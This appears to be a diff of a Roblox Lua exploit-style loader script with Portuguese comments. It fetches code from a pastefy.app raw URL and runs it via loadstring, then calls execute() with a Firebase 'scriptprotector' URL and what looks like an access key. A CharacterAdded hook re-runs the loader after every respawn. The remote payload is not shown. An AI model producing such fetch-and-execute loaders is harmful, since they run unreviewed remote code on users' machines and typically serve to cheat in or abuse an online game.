@@ -1,1 +1,16 @@
-loadstring(game:HttpGetAsync('https://pastefy.app/mJ8vapGJ/raw'))()execute("https://scriptprotector-d6fe7-default-rtdb.firebaseio.com/", "B4SraukVMMsjcGG2rAzqm2m0AkO5mY4bt3PkeNoo", "Script9")
+-- Função pra carregar seu script
+local function carregarScript()
+    pcall(function()
+        loadstring(game:HttpGet('https://pastefy.app/mJ8vapGJ/raw'))()
+        execute("https://scriptprotector-d6fe7-default-rtdb.firebaseio.com/", "B4SraukVMMsjcGG2rAzqm2m0AkO5mY4bt3PkeNoo", "Script9")
+    end)
+end
+
+-- Executa o script na hora
+carregarScript()
+
+-- Garante que ele continue mesmo depois de morrer e voltar
+game.Players.LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(1)
+    carregarScript()
+end)
